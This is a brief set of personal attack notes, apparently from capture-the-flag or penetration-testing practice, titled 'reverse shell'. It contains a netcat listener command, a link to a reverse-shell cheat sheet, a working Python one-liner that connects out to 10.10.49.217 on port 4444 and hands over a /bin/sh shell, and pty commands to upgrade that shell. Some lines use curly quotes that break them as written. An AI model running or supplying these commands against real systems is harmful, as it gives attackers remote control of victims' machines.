**reverse shell**
nc -lvnp 4444
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.49.217",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

which python3
python3 -c ‘import pty; pty.spawn(“/bin/bash”)’ - to see the path/directory
python -c ‘import pty; pty.spawn(“/bin/bash”)’                
